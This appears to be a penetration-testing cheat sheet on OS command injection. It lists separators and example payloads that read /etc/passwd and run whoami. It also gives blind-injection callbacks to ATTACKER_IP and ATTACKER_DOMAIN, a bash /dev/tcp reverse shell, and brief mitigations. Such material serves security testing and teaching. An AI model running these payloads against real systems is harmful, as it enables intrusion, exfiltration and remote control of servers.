# Command Injection

Execute OS commands on the server through vulnerable input fields. Usually found where the app passes user input to a system command.

## Common Vulnerable Patterns

Applications that call system commands with user input:
- Ping/traceroute tools
- DNS lookup pages
- File operations
- PDF generators

## Testing

### Command Separators

```bash
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)
```

### Examples

```
# If the app runs: ping USER_INPUT
127.0.0.1; whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 && id
```

### Blind Command Injection

No output displayed -- use time delays or out-of-band:

```bash
# Time-based
127.0.0.1; sleep 10

# Out-of-band (DNS or HTTP callback)
127.0.0.1; curl http://ATTACKER_IP/$(whoami)
127.0.0.1; nslookup $(whoami).ATTACKER_DOMAIN
```

### Reverse Shell via Command Injection

```bash
127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

## Windows vs Linux

| Separator | Linux | Windows |
|-----------|-------|---------|
| `;` | Yes | No |
| `\|` | Yes | Yes |
| `\|\|` | Yes | Yes |
| `&` | Yes | Yes |
| `&&` | Yes | Yes |
| `` ` `` | Yes | No |
| `$()` | Yes | No |

## Mitigations

- Avoid passing user input to system commands
- Use language-native libraries instead of shell commands
- Input validation with strict allowlists
- Least privilege -- run web apps as low-privilege user
